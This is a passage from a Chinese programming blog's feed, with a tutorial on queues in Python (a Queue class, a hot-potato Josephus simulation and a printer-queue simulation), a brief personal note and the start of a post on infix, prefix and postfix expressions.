    <content type="html"><![CDATA[<h1 id="什么是队列"><a href="#什么是队列" class="headerlink" title="什么是队列"></a>什么是队列</h1><p>队列是项的有序结合，其中添加新项的一端称为队尾，移除项的一端称为队首。当一个元素从队尾进入队列时，一直向队首移动，直到它成为下一个需要移除的元素为止。<a id="more"></a></p><p>最近添加的元素必须在队尾等待。集合中存活时间最长的元素在队首，这种排序成为 FIFO，先进先出，也被成为先到先得。</p><p>+</p><p>队列的最简单的例子是我们平时不时会参与的列。排队等待电影，在杂货店的收营台等待，在自助餐厅排队等待（这样我们可以弹出托盘栈）。行为良好的线或队列是有限制的，因为它只有一条路，只有一条出路。不能插队，也不能离开。你只有等待了一定的时间才能到前面。Figure 1 展示了一个简单的 Python 对象队列。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.10.%E4%BB%80%E4%B9%88%E6%98%AF%E9%98%9F%E5%88%97/assets/3.10.%E4%BB%80%E4%B9%88%E6%98%AF%E9%98%9F%E5%88%97.figure1.png" alt="image"></p><p><em>Figure 1</em></p><p>计算机科学也有常见的队列示例。我们的计算机实验室有 30 台计算机与一台打印机联网。当学生想要打印时，他们的打印任务与正在等待的所有其他打印任务“一致”。第一个进入的任务是先完成。如果你是最后一个，你必须等待你前面的所有其他任务打印。我们将在后面更详细地探讨这个有趣的例子。</p><p>除了打印队列，操作系统使用多个不同的队列来控制计算机内的进程。下一步做什么的调度通常基于尽可能快地执行程序和尽可能多的服务用户的排队算法。此外，当我们敲击键盘时，有时屏幕上出现的字符会延迟。这是由于计算机在那一刻做其他工作。按键的内容被放置在类似队列的缓冲器中，使得它们最终可以以正确的顺序显示在屏幕上。</p><h3 id="1-队列抽象数据类型"><a href="#1-队列抽象数据类型" class="headerlink" title="1.队列抽象数据类型"></a>1.队列抽象数据类型</h3><p>队列抽象数据类型由以下结构和操作定义。如上所述，队列被构造为在队尾添加项的有序集合，并且从队首移除。队列保持FIFO属性。队列操作如下。</p><ul><li>Queue()创建一个空的新队列。它不需要参数，并返回一个空队列。</li><li>enqueue（item）将新项添加到队尾。它需要item作为参数，并不返回任何内容。</li><li>dequeue()从队首移除项。它不需要参数并返回item。队列被修改。</li><li>isEmpty()查看队列是否为空。它不需要参数，并返回布尔值。</li><li>size（）返回队列中的项数。它不需要参数，并返回一个整数。</li></ul><p>作为示例，我们假设q是已经创建并且当前为空的队列，则Table 1展示了队列操作序列的结果。右边表示队首。4是第一个入队的项，因此它dequeue返回的第一个项。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.11.%E9%98%9F%E5%88%97%E6%8A%BD%E8%B1%A1%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/assets/3.11.%E9%98%9F%E5%88%97%E6%8A%BD%E8%B1%A1%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.table1.png" alt="image"></p><h3 id="2-Python实现队列"><a href="#2-Python实现队列" class="headerlink" title="2.Python实现队列"></a>2.Python实现队列</h3><p>我们为了实现队列抽象数据类型创建一个新类。和前面一样，我们将使用列表集合来作为构建队列的内部表示。</p><p>我们需要确定列表的哪一端作为队首，哪一端作为队尾。Listing 1 所示的实现假定队尾在列表中的位置为 0。这允许我们使用列表上的插入函数向队尾添加新元素。弹出操作可用于删除队首的元素（列表的最后一个元素）。回想一下，这也意味着入队为 O(n)，出队为 O(1)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Queue</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.items = []</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isEmpty</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.items == []</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enqueue</span><span class="params">(self, item)</span>:</span></div><div class="line">        self.items.insert(<span class="number">0</span>,item)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dequeue</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.items.pop()</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">size</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> len(self.items)</div><div class="line"></div><div class="line">Listing <span class="number">1</span></div><div class="line">进一步的操作这个队列产生如下结果：</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>q.size()</div><div class="line"><span class="number">3</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>q.isEmpty()</div><div class="line"><span class="keyword">False</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>q.enqueue(<span class="number">8.4</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>q.dequeue()</div><div class="line"><span class="number">4</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>q.dequeue()</div><div class="line"><span class="string">'dog'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>q.size()</div><div class="line"><span class="number">2</span></div></pre></td></tr></table></figure><h3 id="3-模拟：烫手山芋"><a href="#3-模拟：烫手山芋" class="headerlink" title="3.模拟：烫手山芋"></a>3.模拟：烫手山芋</h3><p>队列的应用之一是模拟需要以FIFO方式管理数据的真是场景。首先，让我们看看孩子们的游戏烫手山芋，在这个游戏中（见Figure 2),孩子们围成一个圈，并尽可能快的将一个山芋递给旁边的孩子。在某一个时间，动作结束，有山芋的孩子从圈中移除。游戏继续开始知道剩下最后一个孩子。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.13.%E6%A8%A1%E6%8B%9F%EF%BC%9A%E7%83%AB%E6%89%8B%E5%B1%B1%E8%8A%8B/assets/3.13.%E6%A8%A1%E6%8B%9F%EF%BC%9A%E7%83%AB%E6%89%8B%E5%B1%B1%E8%8A%8B.figure2.png" alt="image"></p><p><em>Figure 2</em></p><p>这个游戏相当于著名的约瑟夫问题，一个一世纪著名历史学家弗拉维奥·约瑟夫斯的传奇故事。故事讲的是，他和他的39个战友被罗马军队包围在洞中。他们决定宁愿死，也不成为罗马人的奴隶。他们围成一个圈，其中一人被指定为第一个人，顺时针报数到第七人，就将他杀死。约瑟夫斯是一个成功的数学家，他立即想出了应该坐到哪才能成为最后一人。最后，他加入了罗马的一方，而不是杀了自己。你可以找到这个故事的不同版本，有些说是每次报数 3 个人，有人说允许最后一个人逃跑。无论如何，思想是一样的。</p><p>我们将模拟这个烫手芋的过程，我们的程序将输入名称列表和一个称为num常量用于报数。它将返回以num为单位重复报数后剩余的最后一个人的姓名。</p><p>为了模拟这个圈，我们使用队列（见Figure 3）。假设拿着山芋的孩子在队列的前面。当拿到山芋的时候，这个孩子将先出列再入队列，把他放在队列的最后。经过num次的出队入队后，前面的孩子将被永久移除队列。并且另一个周期开始，继续此过程，直到另一个周期的开始，继续此过程，直到只剩下一个名字（队列的大小为1）。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.13.%E6%A8%A1%E6%8B%9F%EF%BC%9A%E7%83%AB%E6%89%8B%E5%B1%B1%E8%8A%8B/assets/3.13.%E6%A8%A1%E6%8B%9F%EF%BC%9A%E7%83%AB%E6%89%8B%E5%B1%B1%E8%8A%8B.figure3.png" alt="image"></p><p><em>Figure 3</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pythonds.basic.queue <span class="keyword">import</span> Queue</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hotPotato</span><span class="params">(namelist, num)</span>:</span></div><div class="line">    simqueue = Queue()</div><div class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> namelist:</div><div class="line">        simqueue.enqueue(name)</div><div class="line"></div><div class="line">    <span class="keyword">while</span> simqueue.size() &gt; <span class="number">1</span>:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</div><div class="line">            simqueue.enqueue(simqueue.dequeue())</div><div class="line"></div><div class="line">        simqueue.dequeue()</div><div class="line"></div><div class="line">    <span class="keyword">return</span> simqueue.dequeue()</div><div class="line"></div><div class="line">print(hotPotato([<span class="string">"Bill"</span>,<span class="string">"David"</span>,<span class="string">"Susan"</span>,<span class="string">"Jane"</span>,<span class="string">"Kent"</span>,<span class="string">"Brad"</span>],<span class="number">7</span>))</div></pre></td></tr></table></figure><p><em>Active code 1</em></p><p>请注意，在此示例中，计数常数的值大于列表中的名称数。这不是一个问题，因为队列像一个圈，计数会重新回到开始，直到达到计数值。另外，请注意，列表加载到队列中以使列表上的名字位于队列的前面。在这种情况下，<code>Bill</code> 是列表中的第一个项，因此他在队列的前面。</p><h3 id="4-模拟：打印机"><a href="#4-模拟：打印机" class="headerlink" title="4.模拟：打印机"></a>4.模拟：打印机</h3><p>一个更有趣的模拟是允许我们研究本节前面描述的打印机的行为，回想一下，当学生向共享打印机发送打印任务时，任务被放置在队列中以便以先来先服务的方式被处理。此配置会出现许多问题。其中最重要的点可能是打印机是否能够处理一定量的工作。如果它不能，学生将等待太长时间打印，可能会错过他们的下一节课。</p><p>在计算机科学实验室里考虑下面的情况。平均每天大约10名学生在任何给定时间在实验室工作。这些学生通常在此期间打印两次，这些任务的长度范围从1到20页。实验室中的打印机较旧，每分钟以草稿质量可以处理10页。打印机可以切换以提供更好的质量，但是它将每分钟只能处理五页。较慢的打印速度可能会使学生等待太久。应使用什么页面速率？</p><p>我们可以通过建立一个模拟实验来决定。我们将需要为学生，打印任务和打印机构建表现表示（Figure 4）。当学生提交打印任务时，我们将把他们添加到等待列表中，一个打印任务的队列。 当打印机完成任务时，它将检查队列，以检查是否有剩余的任务要处理。我们感兴趣的是学生等待他们的论文打印的平均时间。这等于任务在队列中等待的平均时间量。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.14.%E6%A8%A1%E6%8B%9F%EF%BC%9A%E6%89%93%E5%8D%B0%E6%9C%BA/assets/3.14.%E6%A8%A1%E6%8B%9F%EF%BC%9A%E6%89%93%E5%8D%B0%E6%9C%BA.figure4.png" alt="image"></p><p><em>Figure 4</em></p><p>为了为这种情况建模，我们需要使用一些概率。例如，学生可以打印长度从1到20页的纸张、如果从1到20的每个长度有同样的可能性。则可以通过使用1和20之间的随机数来模拟打印任务的实际长度。这意味着出现从1到20的任何长度的机会是平等的。如果实验室中有10个学生，每人打印两次，则平均每小时有20个打印任务。在任何给定的秒，打印任务将被创建的机会是什么？回答这个问题的方法时考虑任务与时间的比率。每小时20个任务意味着平均每180秒将有一个任务：<br><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.14.%E6%A8%A1%E6%8B%9F%EF%BC%9A%E6%89%93%E5%8D%B0%E6%9C%BA/assets/3.14.%E6%A8%A1%E6%8B%9F%EF%BC%9A%E6%89%93%E5%8D%B0%E6%9C%BA.figure1.png" alt="image"></p><p>对于每一秒，我们可以通过生成1到180之间的随机数来模拟打印任务发生的机会。如果数字是180，我们说一个任务已经创建。请注意，可能会在一下子创建许多任务，或者需要等待一段时间才有任何。这就是模拟的本质。你想模拟真实的情况就需要尽可能接近一般参数。</p><h4 id="主要模拟步骤"><a href="#主要模拟步骤" class="headerlink" title="主要模拟步骤"></a>主要模拟步骤</h4><ol><li>创建打印任务的队列，每个任务都有个时间戳。队列启动的时候为空。</li><li>每秒（currentSecond）：<ul><li>是否创建新的打印任务？如果是，将 <code>currentSecond</code> 作为时间戳添加到队列。</li><li>如果打印机不忙并且有任务在等待<ul><li>从打印机队列中删除一个任务并将其分配给打印机</li><li>从 <code>currentSecond</code> 中减去时间戳，以计算该任务的等待时间。</li><li>将该任务的等待时间附件到列表中稍后处理。</li><li>根据打印任务的页数，确定需要多少时间。</li></ul></li><li>打印机需要一秒打印，所以得从该任务的所需的等待时间减去一秒。</li><li>如果任务已经完成，换句话说，所需的时间已经达到零，打印机空闲。</li></ul></li><li>模拟完成后，从生成的等待时间列表中计算平均等待时间。</li></ol><h4 id="Python实现"><a href="#Python实现" class="headerlink" title="Python实现"></a>Python实现</h4><p>为了设计此模拟，我们将为上述三个真实世界创建类：Printer，Task，PrintQueue</p><p>Printer类（Listing 2）需要跟踪它当前是否有任务。如果有，则它处于忙碌状态（13-17行），并且可以从任务的页数计算所需的时间。构造函数允许初始化每分钟页面的配置，tick方法将内部定时器递减知道打印机设置为空闲（11行）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Printer</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, ppm)</span>:</span></div><div class="line">        self.pagerate = ppm</div><div class="line">        self.currentTask = <span class="keyword">None</span></div><div class="line">        self.timeRemaining = <span class="number">0</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tick</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">if</span> self.currentTask != <span class="keyword">None</span>:</div><div class="line">            self.timeRemaining = self.timeRemaining - <span class="number">1</span></div><div class="line">            <span class="keyword">if</span> self.timeRemaining &lt;= <span class="number">0</span>:</div><div class="line">                self.currentTask = <span class="keyword">None</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">busy</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">if</span> self.currentTask != <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">startNext</span><span class="params">(self,newtask)</span>:</span></div><div class="line">        self.currentTask = newtask</div><div class="line">        self.timeRemaining = newtask.getPages() * <span class="number">60</span>/self.pagerate</div><div class="line">        </div><div class="line">        <span class="keyword">import</span> random</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,time)</span>:</span></div><div class="line">        self.timestamp = time</div><div class="line">        self.pages = random.randrange(<span class="number">1</span>,<span class="number">21</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getStamp</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.timestamp</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getPages</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.pages</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">waitTime</span><span class="params">(self, currenttime)</span>:</span></div><div class="line">        <span class="keyword">return</span> currenttime - self.timestamp</div><div class="line">      </div><div class="line">      <span class="keyword">from</span> pythonds.basic.queue <span class="keyword">import</span> Queue</div><div class="line"></div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">simulation</span><span class="params">(numSeconds, pagesPerMinute)</span>:</span></div><div class="line"></div><div class="line">    labprinter = Printer(pagesPerMinute)</div><div class="line">    printQueue = Queue()</div><div class="line">    waitingtimes = []</div><div class="line"></div><div class="line">    <span class="keyword">for</span> currentSecond <span class="keyword">in</span> range(numSeconds):</div><div class="line"></div><div class="line">      <span class="keyword">if</span> newPrintTask():</div><div class="line">         task = Task(currentSecond)</div><div class="line">         printQueue.enqueue(task)</div><div class="line"></div><div class="line">      <span class="keyword">if</span> (<span class="keyword">not</span> labprinter.busy()) <span class="keyword">and</span> (<span class="keyword">not</span> printQueue.isEmpty()):</div><div class="line">        nexttask = printQueue.dequeue()</div><div class="line">        waitingtimes.append(nexttask.waitTime(currentSecond))</div><div class="line">        labprinter.startNext(nexttask)</div><div class="line"></div><div class="line">      labprinter.tick()</div><div class="line"></div><div class="line">    averageWait=sum(waitingtimes)/len(waitingtimes)</div><div class="line">    print(<span class="string">"Average Wait %6.2f secs %3d tasks remaining."</span>%(averageWait,printQueue.size()))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">newPrintTask</span><span class="params">()</span>:</span></div><div class="line">    num = random.randrange(<span class="number">1</span>,<span class="number">181</span>)</div><div class="line">    <span class="keyword">if</span> num == <span class="number">180</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">    simulation(<span class="number">3600</span>,<span class="number">5</span>)</div></pre></td></tr></table></figure><h4 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h4><p>我们试图回答一个问题，即当前打印机是否可以处理任务负载，如果它设置为打印更好的质量，较慢的页面速率。我们采用一个方法是编写一个模拟打印作为各种页数和到达时间的随机事件的模拟。</p><p>上面的输出显示，每分钟打印5页，平均等待时间从低的17秒到高的376秒（约6分钟）。使用更快的打印速旅，低值为1秒，高值仅为 28。此外，在 10 次运行中的 8 次，每分钟 5 页，打印任务在结束时仍在队列中等待。</p><p>因此，我们说减慢打印机的速度以获得更好的质量可能不是一个好主意。学生们不能等待他们的论文打印完，特别是当他们需要到下一个班级。六分钟的等待时间太长了。</p><p>这种类型的模拟分析允许我们回答许多问题，通常被称为“如果”的问题。我们需要做的是改变模拟使用的参数，我们可以模拟任何数量。例如</p><ul><li>如果入学人数增加，平均学生人数增加20人，该怎么办？</li><li>如果是星期六，学生不需要上课怎么办？他们能负担的了吗？</li><li>如果平均打印任务的大小减少了，由于Python是一个强大的语言，程序往往要短得多？</li></ul><p>这些问题都可以通过修改上述模拟来回答。然而，重要的是要记住，模拟有效取决于构建它的假设是没问题的。关于每小时打印任务的数量和每小时的学生数量的真实数据对于构建鲁棒性的模拟是必要的。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;什么是队列&quot;&gt;&lt;a href=&quot;#什么是队列&quot; class=&quot;headerlink&quot; title=&quot;什么是队列&quot;&gt;&lt;/a&gt;什么是队列&lt;/h1&gt;&lt;p&gt;队列是项的有序结合，其中添加新项的一端称为队尾，移除项的一端称为队首。当一个元素从队尾进入队列时，一直向队首移动，直到它成为下一个需要移除的元素为止。
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>生活</title>
    <link href="http://adamzeng.site/2017/10/27/%E7%94%9F%E6%B4%BB/"/>
    <id>http://adamzeng.site/2017/10/27/生活/</id>
    <published>2017-10-27T12:23:08.000Z</published>
    <updated>2017-10-27T12:26:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近缺乏睡眠，很多东西想了解的感觉不容易了解，很多时候发现精力很难跟上！<a id="more"></a></p><p>希望能够跟上各位大佬的脚步。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近缺乏睡眠，很多东西想了解的感觉不容易了解，很多时候发现精力很难跟上！
    
    </summary>
    
      <category term="生活" scheme="http://adamzeng.site/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="生活" scheme="http://adamzeng.site/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>中缀前缀和后缀表达式</title>
    <link href="http://adamzeng.site/2017/10/27/%E4%B8%AD%E7%BC%80%E5%89%8D%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>http://adamzeng.site/2017/10/27/中缀前缀和后缀表达式/</id>
    <published>2017-10-27T09:13:24.000Z</published>
    <updated>2017-10-27T12:28:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>当你编写一个算术表达式如 <code>B*C</code> 时，表达式的形式使你能够正确理解它。在这种情况下，你知道 B 乘以 C, 因为乘法运算符 <code>*</code> 出现在表达式中。这种类型的符号称为中缀，因为运算符在它处理的两个操作数之间。看另外一个中缀示例，<code>A+B*C</code>，运算符 <code>+</code> 和 <code>*</code> 仍然出现在操作数之间。这里面有个问题是，他们分别作用于哪个运算数上，<code>+</code> 作用于 A 和 B , 还是 <code>*</code> 作用于 B 和 C？表达式似乎有点模糊。<a id="more"></a></p><p>事实上，你已经读写过这些类型的表达式很长一段时间，所以它们对你不会导致什么问题。这是因为你知道运算符 <code>+</code>和 <code>*</code>。每个运算符都有一个优先级。优先级较高的运算符在优先级较低的运算符之前使用。唯一改变顺序的是括号的存在。算术运算符的优先顺序是将乘法和除法置于加法和减法之上。如果出现具有相等优先级的两个运算符，则使用从左到右的顺序排序或关联。</p><p>我们使用运算符优先级来解释下表达式 <code>A+B*C</code>。B 和 C 首先相乘，然后将 A 与该结果相加。<code>(A+B)*C</code> 将强制在乘法之前执行 A 和 B 的加法。在表达式 <code>A+B+C</code> 中，最左边的 + 首先使用。</p><p>虽然这一切对你来说都很明显。但请记住，计算机需要准确知道要执行的操作符和顺序。一种保证不会对操作顺序产生混淆的表达式的方法是创建一个称为完全括号表达式的表达式。这种类型的表达式对每个运算符都使用一对括号。括号没有歧义的指示操作的顺序。也没有必要记住任何优先规则。</p><p>有两种非常重要的表达式格式，你可能一开始不会很明显的看出来。中缀表达式 <code>A+B</code>, 如果我们移动两个操作数之间的运算符会发生什么？结果表达式变成 <code>+ A B</code>。同样，我们也可以将运算符移动到结尾，得到 <code>A B +</code> ，这样看起来有点奇怪。</p><p>改变操作符的位置得到了两种新的表达式格式，前缀和后缀。前缀表达式符号要求所有运算符在它们处理的两个操作数之前。另一个方面，后缀要求其操作符在相应的操作数之后。看下更多的例子 (见 Table 2)</p><p><code>A+B*C</code> 将在前缀中写为 <code>+ A * B C</code> 。乘法运算符紧接在操作数 B 和 C 之前，表示 <code>*</code> 优先于 <code>+</code>。然后加法运算符出现在 A 和乘法的结果之前。</p><p>在后缀中，表达式将是 <code>A B C * +</code>，再次，操作的顺序被保留，因为 <code>*</code> 紧接在 B 和 C 之后出现，表示 <code>*</code> 具有高优先级，<code>+</code> 优先级低。虽然操作符在它们各自的操作数前后移动，但是顺序相对于彼此保持完全相同。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.9.%E4%B8%AD%E7%BC%80%E5%89%8D%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/assets/3.9.%E4%B8%AD%E7%BC%80%E5%90%8E%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F.table2.png" alt="image"></p><p><em>table 2</em></p><p>现在考虑中缀表达式 <code>(A + B) * C</code>，回想下，在这种情况下，中缀需要括号在乘法之前强制执行加法。然而，当 A+B 写到前缀中时，加法运算符简单的移动到操作数 <code>+ A B</code> 之前。这个操作的结果成为乘法的第一个操作数。乘法运算符移动到整个表达式的前面，得出 <code>* + A B C</code>，同样，在后缀 <code>A B +</code>中，强制先加法。可以直接对该结果和剩余的操作数 C 相乘。然后，得出后缀表达式为 <code>A B + C *</code>。</p><p>再次考虑这三个表达式(见 Table 3)，括号不见了。为什么在前缀和后缀的时候不需要括号了呢？答案是操作符对于他们的操作数不再模糊，只有中缀才需要括号，前缀和后缀表达式的操作顺序完全由操作符的顺序决定。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.9.%E4%B8%AD%E7%BC%80%E5%89%8D%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/assets/3.9.%E4%B8%AD%E7%BC%80%E5%90%8E%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F.table3.png" alt="image"></p><p><em>table 3</em></p><p>Table 4 展示了一些其他的例子</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.9.%E4%B8%AD%E7%BC%80%E5%89%8D%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/assets/3.9.%E4%B8%AD%E7%BC%80%E5%90%8E%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F.table4.png" alt="image"></p><p><em>table 4</em></p><h4 id="1-中缀表达式转换前缀和后缀"><a href="#1-中缀表达式转换前缀和后缀" class="headerlink" title="1.中缀表达式转换前缀和后缀"></a>1.中缀表达式转换前缀和后缀</h4><p>到目前为止，我们已经使用特定方法在中缀表达式和等效前缀和后缀表达式符号之间进行转换。正如你可能期望的，有一些算法来执行转换，允许任何复杂表达式转换。</p><p>我们考虑的第一种技术使用前面讨论的完全括号表达式的概念。回想一下，<code>A + B * C</code>可以写成<code>（A +（B * C））</code>，以明确标识乘法优先于加法。然而，仔细观察，你可以看到每个括号对还表示操作数对的开始和结束，中间有相应的运算符。</p><p>看上面的子表达式<code>（B * C）</code>中的右括号。如果我们将乘法符号移动到那个位置，并删除匹配的左括号，得到得到 <code>B C *</code>，我们实际上已经将子表达式转换为后缀符号。如果加法运算符也被移动到其相应的右括号位置并且匹配的左括号被去除，则将得到完整的后缀表达式。（见Figure 6）。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.9.%E4%B8%AD%E7%BC%80%E5%89%8D%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/assets/3.9.%E4%B8%AD%E7%BC%80%E5%90%8E%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F.figure6.png" alt="image"></p><p><em>Figure 6</em></p><p>如果我们不是将符号移动到右括号的位置，我们将它向左移动，我们得到前缀符号（见 Figure 7）。圆括号对的位置实际上是包含的运算符的最终未知的线索。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.9.%E4%B8%AD%E7%BC%80%E5%89%8D%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/assets/3.9.%E4%B8%AD%E7%BC%80%E5%90%8E%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F.figure7.png" alt="image"></p><p><em>Figure 